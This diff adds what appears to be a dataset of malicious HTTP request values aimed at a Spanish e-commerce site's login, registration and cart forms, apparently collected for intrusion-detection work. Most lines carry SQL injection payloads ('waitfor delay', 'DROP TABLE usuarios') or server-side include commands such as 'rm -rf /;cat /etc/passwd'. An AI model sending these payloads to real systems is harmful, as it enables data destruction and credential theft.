@@ -1,0 +1,368 @@
+"insertar | 183','0','0');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1"
+"""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+"1','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"Vaciar carrito<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"
+');waitfor delay '0:0:15';-- HTTP/1.1
+"','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"registro | nyberg | predicha | Carmina | Serarols Ginesta<!--#include file=""archivo_secreto"" --> | redford2@enlanzarote.com.cz | 80243620R | Zumel S/N,  | Mas de Barberans | 05420 | Zamora | 5782200649154235 | Registrar HTTP/1.1"
+"registro | nyberg | predicha | Carmina | Serarols Ginesta | redford2@enlanzarote.com.cz | 80243620R | Zumel S/N,  | Mas de Barberans | 05420 | Zamora | 5782200649154235 | ';waitfor delay '0:0:15';-- HTTP/1.1"
+Vaciar carrito'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1
+"<!--#include file=""archivo_secreto"" --> HTTP/1.1"
+1');waitfor delay '0:0:15';-- HTTP/1.1
+"Credenciales incorrectas','0');waitfor delay '0:0:15';-- HTTP/1.1"
+');waitfor delay '0:0:15';-- | 4762 | Confirmar HTTP/1.1
+"Vaciar carrito','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"insertar | <!--#EXEC cmd=""ls /""--> | Pasar por caja HTTP/1.1"
+"Vaciar carrito""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"
+"','0');waitfor delay '0:0:15';-- HTTP/1.1"
+insertar | 7641 | ';waitfor delay '0:0:15';-- HTTP/1.1
+"entrar | dadang','0','0');waitfor delay '0:0:15';-- | 6a1er87 | on | Entrar HTTP/1.1"
+"insertar | 6801 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+"insertar | 4639 | ','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1
+"registro | amar | encallecer | Celedonio | Compres Manau | danielson@bloodline.mc | 45415076N | Valladolid, 99 7A""><!--#EXEC cmd=""dir ""-->< | Borges del Camp, Les | 50343 | Baleares (Illes) | 1817134739036015 | Registrar HTTP/1.1"
+"3 | Vino Rioja | 39 | 69 | ','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"entrar | lutz | OpimA | off""><!--#EXEC cmd=""dir ""-->< | Entrar HTTP/1.1"
+"Credenciales incorrectas<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"
+"insertar""><!--#EXEC cmd=""dir ""-->< | 8962 | Confirmar HTTP/1.1"
+"insertar | 898 | Confirmar','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"entrar | arro | CarMinAR<!--#include file=""archivo_secreto"" --> | on | Entrar HTTP/1.1"
+"1<!--#include file=""archivo_secreto"" --> HTTP/1.1"
+"entrar | satta | es699601r | on<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Entrar HTTP/1.1"
+"registro | mccarron | revistero | Adelqui | Valente Sanchis','0');waitfor delay '0:0:15';-- | gargen@007tv.zw | 83296238J | C/ Fuente Morena, 146,  | Rillo | 17752 | Lleida | 3359754319393302 | Registrar HTTP/1.1"
+';waitfor delay '0:0:15';-- HTTP/1.1
+"insertar | 795 | Pasar por caja','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"registro | dido | enmarch3tar | Bertilda | Deverdun | low.feliciano@azkara.sj | 19110618X | Prolongacion Algeciras 169,  | Navarredonda de Gredos | 18418 | Navarra | 1628195660765454 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1"
+"1""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+"entrar | espinosa | candado | off','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"
+"entrar | espinosa | candado | <!--#EXEC cmd=""ls /""--> | Entrar HTTP/1.1"
+"Vaciar carrito','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"Credenciales incorrectas<!--#include file=""archivo_secreto"" --> HTTP/1.1"
+"Credenciales incorrectas""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+insertar | 2860 | Confirmar';waitfor delay '0:0:15';-- HTTP/1.1
+insertar | ');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1
+"registro | muise | l321n2c3r','0','0','0');waitfor delay '0:0:15';-- | Matco | Yera Patriz | bacall@djbroadcast.hk | 75976186X | Calle Garcia Arista 97, 6?B | Betancuria | 34191 | Cuenca | 9917801099618736 | Registrar HTTP/1.1"
+"2','0');waitfor delay '0:0:15';-- HTTP/1.1"
+1';waitfor delay '0:0:15';-- HTTP/1.1
+"entrar | yansun | 03s6ig89<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | on | Entrar HTTP/1.1"
+"entrar | yansun | ','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1"
+"','0');waitfor delay '0:0:15';-- | 9805 | Pasar por caja HTTP/1.1"
+"entrar | wolfie8 | antagallar | off | Entrar<!--#EXEC cmd=""ls /""--> HTTP/1.1"
+"1','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+');waitfor delay '0:0:15';-- | 4564 | Confirmar HTTP/1.1
+"','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+insertar | 8789 | ');waitfor delay '0:0:15';-- HTTP/1.1
+"entrar | <!--#include file=""archivo_secreto"" --> | COnSO0atiVO | on | Entrar HTTP/1.1"
+"registro | charlesb | m96fan19 | Durante | Campusano Caldero | gheorghiu-battaglia@sanchezgordo.bt | 44335499D | C/ Padre Luis Maria Arteche 0 5B | ""><!--#EXEC cmd=""dir ""-->< | 37716 | Cantabria | 6556979183874771 | Registrar HTTP/1.1"
+"insertar | 1510<!--#include file=""archivo_secreto"" --> | Confirmar HTTP/1.1"
+Vaciar carrito');waitfor delay '0:0:15';-- HTTP/1.1
+1'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1
+entrar | alvarez | 9ec828'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | on | Entrar HTTP/1.1
+"insertar | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1"
+"registro | alane | 9u7Je | Ignolinda | Motta | fargue-innis@soycastellano.no | 04469375S | Calle Melchor Cobo Medina, 16, 6H | Andorra | 09129 | <!--#EXEC cmd=""ls /""--> | 1134011255413195 | Registrar HTTP/1.1"
+insertar | 342 | Confirmar';waitfor delay '0:0:15';-- HTTP/1.1
+"Credenciales incorrectas','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"2<!--#include file=""archivo_secreto"" --> HTTP/1.1"
+Credenciales incorrectas');waitfor delay '0:0:15';-- HTTP/1.1
+"registro | diahann | mARcel_iNo | Asad | Tonato Valle | grizzard@ytv.com.mv | 75976186X | C/ Juan De Lara 115, 9?A | Mazcuerras','0','0','0','0');waitfor delay '0:0:15';-- | 43393 | Valencia | 8430846550683709 | Registrar HTTP/1.1"
+"entrar | leppert | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | on | Entrar HTTP/1.1"
+"insertar','0','0','0');waitfor delay '0:0:15';-- | 8588 | Confirmar HTTP/1.1"
+insertar | 8588 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1
+"entrar | drusie | cAreRa','0','0','0','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1"
+"insertar | 5741 | ','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"entrar | burch | ','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1"
+"insertar<!--#EXEC cmd=""ls /""--> | 3845 | Pasar por caja HTTP/1.1"
+"Credenciales incorrectas','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"entrar | odecki | le080i12 | off | ','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"registro | kingston | tRaSPlAnTe | Johana | ""><!--#EXEC cmd=""dir ""-->< | lobe-cary@videoerotic.mh | 86807165J | Calle Olof Palme S/N,  | Navezuelas | 44330 | Navarra | 4852910314860020 | Registrar HTTP/1.1"
+"registro | lieure | rEbatible | Tarciano | Villalta Tapasco | touret@artesania.org.cv | 42708654T | Calle Eduardo Blanco Amor, 120, 1?B | Sopeira | 12230 | Guadalajara | 7642131917731646<!--#EXEC cmd=""ls /""--> | Registrar HTTP/1.1"
+"registro | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | segundar | Armelio | Gochez | shankley@discon.sz | 25054750E | C/ Fuente Del Rey, S/N,  | Gavilanes | 36110 | Salamanca | 2607422784974121 | Registrar HTTP/1.1"
+"2<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"
+"entrar | zakarow','0','0');waitfor delay '0:0:15';-- | e4pe5imenta2a | on | Entrar HTTP/1.1"
+"Vaciar carrito','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"entrar | dane | e3970iv4r | ','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"
+"registro | prestipi | 9Odad7 | William | Albella Sahagun | northrup@ajuntamentbarcelona20.mu | 33293484H');waitfor delay '0:0:15';-- | Bizenta Mogel 65,  | Casas de Reina | 42216 | Madrid | 8964286236058281 | Registrar HTTP/1.1"
+"<!--#EXEC cmd=""ls /""--> HTTP/1.1"
+"registro | eshelman | fiLosOFAR | Zarif | Torrabadella<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | cavender_jacob@9horas.uk | 73992011E | C/ Marbella 103 8A | Artazu | 29532 | Badajoz | 1546173656033041 | Registrar HTTP/1.1"
+Credenciales incorrectas'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1
+"entrar | hanneke<!--#EXEC cmd=""ls /""--> | dESHILadIZ | off | Entrar HTTP/1.1"
+"insertar | ','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"
+"','0');waitfor delay '0:0:15';-- | marconi1 | adularia | Venancio | Del Campillo Aranda | blier@ropadegolf.com.at | 70108873C | Paratge Pla 18 8?D | Sotorribas | 15391 | Soria | 6078216616409598 | Registrar HTTP/1.1"
+"Vaciar carrito<!--#EXEC cmd=""ls /""--> HTTP/1.1"
+"entrar | lombardy','0','0','0');waitfor delay '0:0:15';-- | j543ihue3a | on | Entrar HTTP/1.1"
+2');waitfor delay '0:0:15';-- HTTP/1.1
+"Credenciales incorrectas','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"insertar | ','0','0','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"
+"Vaciar carrito','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"registro | jessalyn | tra8ucaire | Ventura | Codinacs Bellver | nace@9horas.mg | 55526590J | C/ Zumalacarregui 4 11?H | ','0','0');waitfor delay '0:0:15';-- | 40541 | Segovia | 2481775887753084 | Registrar HTTP/1.1"
+"Vaciar carrito<!--#include file=""archivo_secreto"" --> HTTP/1.1"
+"registro | alair | TubuL6s8 | Reade | Elecciones Iznaga','0','0','0');waitfor delay '0:0:15';-- | rypdal.hidayat@hiperbilbao.bw | 65285775E | Condor, 82 13?E | Paracuellos de la Ribera | 34870 | Salamanca | 9107192968626064 | Registrar HTTP/1.1"
+"entrar | maijala | <!--#include file=""archivo_secreto"" --> | on | Entrar HTTP/1.1"
+registro | pascali | o73-r1111 | Helidora | Estrems | cederlund-sol@aulahost.qa | 90572791X | Calle Urquizu 190 11?F | Santa Magdalena de Pulpis | 05697 | Zaragoza'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 3975543619812448 | Registrar HTTP/1.1
+insertar | 7744 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1
+"','0','0','0','0');waitfor delay '0:0:15';-- | cecelia | terciopelado | Federica | Heusser Talo | sofaer@multasdetransito.cu | 67293578V | Plza. Irantzuko Monasterioaren 63,  | Purullena | 41111 | Lleida | 7562944888996473 | Registrar HTTP/1.1"
+Vaciar carrito';waitfor delay '0:0:15';-- HTTP/1.1
+"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 8166 | Confirmar HTTP/1.1"
+"insertar | 4975 | <!--#include file=""archivo_secreto"" --> HTTP/1.1"
+"3 | Vino Rioja | 85 | 80 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+entrar | hope | infR06g9ble | ');waitfor delay '0:0:15';-- | Entrar HTTP/1.1
+"1<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"
+"registro | bagnato33 | prescindible | Hiram','0','0','0','0');waitfor delay '0:0:15';-- | Penagos Pijoan | fenell@salsaspain.fr | 11130412E | C/ Leon Pinelo, 5 3E | Cordovilla | 10320 | Navarra | 2582130639764727 | Registrar HTTP/1.1"
+"registro | wonuk | pulverizador""><!--#EXEC cmd=""dir ""-->< | Mahoma | Alorda Goicoechea | fenn@ticketsport.nu | 08512419G | Calle Amanecer 105  | Fuente de San Esteban, La | 16611 | Huelva | 9776865441504888 | Registrar HTTP/1.1"
+entrar | robyn | frutillero');waitfor delay '0:0:15';-- | off | Entrar HTTP/1.1
+"insertar','0','0','0');waitfor delay '0:0:15';-- | 2542 | Confirmar HTTP/1.1"
+Credenciales incorrectas';waitfor delay '0:0:15';-- HTTP/1.1
+"insertar | 7686 | Pasar por caja<!--#include file=""archivo_secreto"" --> HTTP/1.1"
+"entrar | lyliston | ""><!--#EXEC cmd=""dir ""-->< | off | Entrar HTTP/1.1"
+"insertar | 6525 | Pasar por caja<!--#EXEC cmd=""ls /""--> HTTP/1.1"
+entrar | chihchie');waitfor delay '0:0:15';-- | unicidad | off | Entrar HTTP/1.1
+entrar | chihchie | unicidad | off | ');waitfor delay '0:0:15';-- HTTP/1.1
+"registro | morelli | <!--#include file=""archivo_secreto"" --> | Erno | Maqueira Somohano | polivitskiui_manzarek2@candidaturaolle-futuronotarial.edu | 35265294S | Pl. Augusto Conte Lacave, 86  | Torre-serona | 09691 | Granada | 9613911673580851 | Registrar HTTP/1.1"
+"entrar | wylie | ""><!--#EXEC cmd=""dir ""-->< | off | Entrar HTTP/1.1"
+"registro | jakabffy | 33aRr179 | VahidReza | Curell Lagares | moura@chicasdiabolo.iq | 75130756Z | Urbanizacion Montesion, 3  | Molinaseca | 45180 | <!--#EXEC cmd=""ls /""--> | 2571648203429012 | Registrar HTTP/1.1"
+"entrar | an-son | 4up493a562i5 | on','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"
+"entrar | ','0','0','0');waitfor delay '0:0:15';-- | 4up493a562i5 | on | Entrar HTTP/1.1"
+insertar | 5289 | Pasar por caja');waitfor delay '0:0:15';-- HTTP/1.1
+"1<!--#EXEC cmd=""ls /""--> HTTP/1.1"
+2 | Queso Manchego | 39 | 27 | ');waitfor delay '0:0:15';-- HTTP/1.1
+"Credenciales incorrectas<!--#EXEC cmd=""ls /""--> HTTP/1.1"
+insertar | 7436 | Confirmar';waitfor delay '0:0:15';-- HTTP/1.1
+"insertar | 7436 | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"
+"registro | hilwa | 79b664ve80 | Delva | Campas Ferrete | everrett@fernandosoto.zr | ','0','0','0','0');waitfor delay '0:0:15';-- | Calle Salares 27 9-B | Teresa | 10162 | Alicante | 8640086440167305 | Registrar HTTP/1.1"
+"registro | torok | 03f3so | Noel Stefani | Vilaseca Regalado | howell@zarasalud.mw | 17400980P | C/ San Andres 79, 7?A | Fontiveros | 49254 | ';waitfor delay '0:0:15';-- | 4507218709160906 | Registrar HTTP/1.1"
+"insertar | 7730 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+"registro | tat7 | p0on57cia008nto | Camelia | Zurita Santander | diessl-claver@tradedeficit.mz | 59059811C | Artes, S/N  | Escobar de Polendos | 18518 | Burgos | 2636619315022095 | Registrar""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+"entrar | mcnair | 81cob6r | off<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Entrar HTTP/1.1"
+entrar | mcnair | 81cob6r | off | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1
+"entrar | ','0','0','0');waitfor delay '0:0:15';-- | 569t179e | on | Entrar HTTP/1.1"
+"insertar | ""><!--#EXEC cmd=""dir ""-->< | Confirmar HTTP/1.1"
+"entrar | toole | e9ternecer | on | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1"
+insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 6072 | Pasar por caja HTTP/1.1
+"registro | hiroyuki | desbullar | Yoconda | Rosas Fabila | saiko@enlanzarote.com.cx | 29372836L | Barriada Juan Xxiii, 100,  | Almargen','0');waitfor delay '0:0:15';-- | 03812 | Toledo | 2218102599227615 | Registrar HTTP/1.1"
+"entrar | ovas<!--#include file=""archivo_secreto"" --> | ric8Me6te | on | Entrar HTTP/1.1"
+';waitfor delay '0:0:15';-- | ovas | ric8Me6te | on | Entrar HTTP/1.1
+"2','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"insertar | 3748 | Pasar por caja<!--#include file=""archivo_secreto"" --> HTTP/1.1"
+"<!--#EXEC cmd=""ls /""--> | crowder | 6.en0e6at2da | on | Entrar HTTP/1.1"
+"2 | Queso Manchego | 100 | 44 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"
+"registro | storelli | enforrar | Adelfo | Pozo Carbot | schiaftino@showenvivo.com.sy');waitfor delay '0:0:15';-- | 56891172M | Calle Virgen De La Estrella, 150,  | Fresno de Rodilla | 49624 | Valencia | 3044392117548178 | Registrar HTTP/1.1"
+"registro | swick | recalzar | Amiel | Del Blanco | ying-carridine@audiosat.sy | 55739537A | Jose Cadierno 186, 6F | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 37621 | Asturias | 2320151892972616 | Registrar HTTP/1.1"
+"entrar','0','0');waitfor delay '0:0:15';-- | zaretsky | 725l479zo | on | Entrar HTTP/1.1"
+entrar | zaretsky | 725l479zo | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Entrar HTTP/1.1
+"<!--#include file=""archivo_secreto"" --> | 6471 | Pasar por caja HTTP/1.1"
+entrar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | hua-yuan | *anoria | off | Entrar HTTP/1.1
+"','0','0');waitfor delay '0:0:15';-- | 2158 | Pasar por caja HTTP/1.1"
+"registro | lemar | 43lpe7de2o | Bianca | Valor Agudo | vallarine7@7horas.mo | 90125861Q | Plaza Monasterio De La Oliva, S/N,  | Tembleque | 20493 | Navarra | 7119531551958366 | Registrar<!--#include file=""archivo_secreto"" --> HTTP/1.1"
+"insertar | ','0','0','0','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"
+registro | brittan | al9mb+532 | Onila | Furcat Zarco | greiff@opticaweb.bu | 36455660Q | Calle Nueve 57 '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Utiel | 01899 | Madrid | 0088492463086794 | Registrar HTTP/1.1
+"insertar<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 9874 | Confirmar HTTP/1.1"
+"entrar | crommie | 0eju0o','0','0');waitfor delay '0:0:15';-- | off | Entrar HTTP/1.1"
+"entrar | crommie | 0eju0o | <!--#EXEC cmd=""ls /""--> | Entrar HTTP/1.1"
+entrar | jasver9');waitfor delay '0:0:15';-- | 76r9v3t2 | off | Entrar HTTP/1.1
+"insertar','0','0','0','0');waitfor delay '0:0:15';-- | 2018 | Pasar por caja HTTP/1.1"
+"registro | correa | 5orTeRa | Fructuosa | Polloni Homdedeu | berto@sindualidad.dd | 49742539W | C/ Einstein, 147, 9?A | Legazpi | 44349','0');waitfor delay '0:0:15';-- | Valencia | 2169388539628734 | Registrar HTTP/1.1"
+"entrar""><!--#EXEC cmd=""dir ""-->< | abdullah | cOrcusIdO | on | Entrar HTTP/1.1"
+2'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1
+"registro | alexi | cUerdA | Donardo | Paracoll','0');waitfor delay '0:0:15';-- | filho@encuentrodominios.is | 01722111D | Enric Granados 137,  | Ruesca | 47248 | Alicante | 0825150389138142 | Registrar HTTP/1.1"
+"insertar | 2373 | Confirmar','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"entrar | heunis | ','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1"
+"insertar | 4981 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+"entrar | ','0','0','0','0');waitfor delay '0:0:15';-- | gAMar9a | off | Entrar HTTP/1.1"
+"insertar','0','0','0');waitfor delay '0:0:15';-- | 3471 | Confirmar HTTP/1.1"
+"','0','0');waitfor delay '0:0:15';-- | 8137 | Pasar por caja HTTP/1.1"
+';waitfor delay '0:0:15';-- | rybczyns | 2a530na9 | on | Entrar HTTP/1.1
+insertar | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Confirmar HTTP/1.1
+"1','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"registro | colline | h30i2o | Sylvina | Mateu Bernaus','0');waitfor delay '0:0:15';-- | sorili@am-si.nf | 75667654T | C/ Del Torrent De L'olla, 111 11?D | Fuerte del Rey | 49610 | Guadalajara | 5880986678228634 | Registrar HTTP/1.1"
+"registro | nataniel | 53rD11c4 | Ligia | Klindt Vanega | cordon4@hojainformativas.je | 96785368B | Pintor Clemente De Torres 169  | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 09125 | Guadalajara | 2447487443590870 | Registrar HTTP/1.1"
+insertar | 6987';waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1
+"entrar | ketan | reng1era','0');waitfor delay '0:0:15';-- | off | Entrar HTTP/1.1"
+"insertar | 8559 | Pasar por caja','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"<!--#include file=""archivo_secreto"" --> | 6458 | Pasar por caja HTTP/1.1"
+"registro | gilly | f+emenciar | Octaviano'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Heredia Wald | meskill_ferlinghetti@wormee.pw | 37936735Y | C/ Ginebre, 98  | Manzanillo | 33310 | Segovia | 1741584206084308 | Registrar HTTP/1.1"
+insertar | 8588 | Confirmar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1
+"','0','0','0');waitfor delay '0:0:15';-- | 8588 | Confirmar HTTP/1.1"
+"registro | digby | gusarapa | Cilatal | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | saint-georges@webhut.mh | 51191165L | Baixada Pontenova-freixeiro 30,  | Portella, La | 37468 | Burgos | 7735767005203893 | Registrar HTTP/1.1"
+"2','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"registro | horak | 6eSi74osO | Blas | Gasca Noria | dearden@hipermadrid.ga | 01101234V | Avenida Comunidad De Madrid 45, 13C | Villarreal de Huerva'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 01170 | Girona | 1336518549569700 | Registrar HTTP/1.1"
+"registro | olivia | Pa-lTa | Clidanor | Weffer Vaamonde""><!--#EXEC cmd=""dir ""-->< | dozier@interanuncios.li | 58040403H | Vista Alegre 90,  | Copons | 43143 | Valladolid | 4437841608475479 | Registrar HTTP/1.1"
+insertar | ';waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1
+"insertar | 3212<!--#EXEC cmd=""ls /""--> | Pasar por caja HTTP/1.1"
+"registro | babatund | pA6OMer9-A<!--#EXEC cmd=""ls /""--> | Juana del Pilar | Luna Barberan | mazurowna@wdsl.om | 19546963E | Villadangos Del Paramo, 82,  | Encinas de Esgueva | 10830 | Alicante | 5365738910346806 | Registrar HTTP/1.1"
+"registro | hormoz | 79Ari68 | Tamar | Unger | ferrandis@ilusionarium.is | 27110453P | C/ Tampa, 34  | Molares, Los""><!--#EXEC cmd=""dir ""-->< | 05410 | Teruel | 7701457023954310 | Registrar HTTP/1.1"
+"registro | yingcdi | pisa-verde | Vianella | Galdeano Piccech | dudgeon@tradora.na | 80818838N | <!--#EXEC cmd=""ls /""--> | Gormaz | 32737 | Zaragoza | 0673547824413217 | Registrar HTTP/1.1"
+"entrar','0','0','0');waitfor delay '0:0:15';-- | goldstei | exp8a1!a6a | on | Entrar HTTP/1.1"
+"registro | yukihiko | 10nfig318c559 | Malias | Monestel Robaldino | nagy@973.lv | 61037738Q | C/ Begonia 49 12F | Borges del Camp, Les | 37621 | Guadalajara | 1924133576102581 | Registrar""><!--#EXEC cmd=""dir ""-->< HTTP/1.1"
+"registro | <!--#include file=""archivo_secreto"" --> | 10nfig318c559 | Malias | Monestel Robaldino | nagy@973.lv | 61037738Q | C/ Begonia 49 12F | Borges del Camp, Les | 37621 | Guadalajara | 1924133576102581 | Registrar HTTP/1.1"
+entrar | eckstein | requeridor | on | ';waitfor delay '0:0:15';-- HTTP/1.1
+"registro | checinsk | c2ad953u8ro | Neria | Taronger | torgov-mattera@yksoluap.edu | 74014005M | Avenida Roque De Gando, 193, 7?E | Castrobol | 26324 | Cuenca | 5680554856223107 | ';waitfor delay '0:0:15';-- HTTP/1.1"
+"entrar','0','0');waitfor delay '0:0:15';-- | drappel | innoc52 | off | Entrar HTTP/1.1"
+"insertar','0','0','0');waitfor delay '0:0:15';-- | 3732 | Confirmar HTTP/1.1"
+"entrar','0','0','0');waitfor delay '0:0:15';-- | roddie9 | 2esu1ador3 | on | Entrar HTTP/1.1"
+"entrar | ','0','0','0');waitfor delay '0:0:15';-- | 2esu1ador3 | on | Entrar HTTP/1.1"
+"registro | norio8 | 4l7ct4ot7pi5a | Jaen | Alicante Oruna | cumby@blogsmegumi.ly','0','0','0','0');waitfor delay '0:0:15';-- | 01105274D | Calle German Monzon Gamon, 46  | Puente la Reina de Jaca | 08278 | Ciudad Real | 3246974816793870 | Registrar HTTP/1.1"
+registro | jovo | 28l3ra8a | Hebelen | Fornalino Grimaldi | ozaki_wanamaker@travelzone.tel | 75981771Y | Calle San Juan Bautista De La Salle 193 6?C | Calatorao | 10191 | Burgos | 3393638948319901 | Registrar');waitfor delay '0:0:15';-- HTTP/1.1
+"','0','0');waitfor delay '0:0:15';-- | 4221 | Confirmar HTTP/1.1"
+entrar | sydney | r$aToNESCA | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Entrar HTTP/1.1
+"','0','0','0','0');waitfor delay '0:0:15';-- | 9014 | Confirmar HTTP/1.1"
+"registro | chaya | c0o4c53TI81 | Zbigniew | Becares Alumbreo | ','0','0');waitfor delay '0:0:15';-- | 23423909L | Nucleo Residencial San Carlos, 5, 3?H | Herrera | 33785 | Soria | 2124793186518142 | Registrar HTTP/1.1"
+"registro | bnrecad | iN!solUBLe | Aurelio | Ospina Soma | humbert@24htranslations.name | 78151636M | Ramat, 145 5?B | Barbastro | 31227 | Valladolid | 5175468282615613 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1"
+"insertar | 401""><!--#EXEC cmd=""dir ""-->< | Pasar por caja HTTP/1.1"
+"insertar | 4965 | Pasar por caja','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+"insertar<!--#include file=""archivo_secreto"" --> | 6858 | Confirmar HTTP/1.1"
+"insertar | 3574 | ','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"
+entrar | hedrich | chonta | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Entrar HTTP/1.1
+"insertar | 6276""><!--#EXEC cmd=""dir ""-->< | Confirmar HTTP/1.1"
+"insertar | 1881<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1"
+insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 6606 | Pasar por caja HTTP/1.1
+"insertar | 9567','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"
+"entrar | beate | esp8rtillero<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | off | Entrar HTTP/1.1"
+2';waitfor delay '0:0:15';-- HTTP/1.1
+"insertar | 8496 | <!--#EXEC cmd=""ls /""--> HTTP/1.1"
+"registro | marquez6 | SIsallo<!--#EXEC cmd=""ls /""--> | Magali | Mojeda Batet | laing@rocofer.pe | 16093683P | Calle Mosen Damian Borobia 38 10-F | Puente Viesgo | 48213 | Albacete | 3563768127894231 | Registrar HTTP/1.1"
+"registro | gavens0 | revirado | Kaya | Mojeda Batet | munshin@cirugiaplasticacordoba.hk | 65532112Y | Plaza Flauta 16, 1?B | Valdeavellano de Tera | <!--#EXEC cmd=""ls /""--> | Teruel | 2452355001922764 | Registrar HTTP/1.1"
+"insertar | 8146','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"
+"registro | peers | at222a1 | Cipriana | Serradell | <!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | 19247264J | C/ Joventut, 182,  | Alegia | 31510 | Salamanca | 8765134980053757 | Registrar HTTP/1.1"
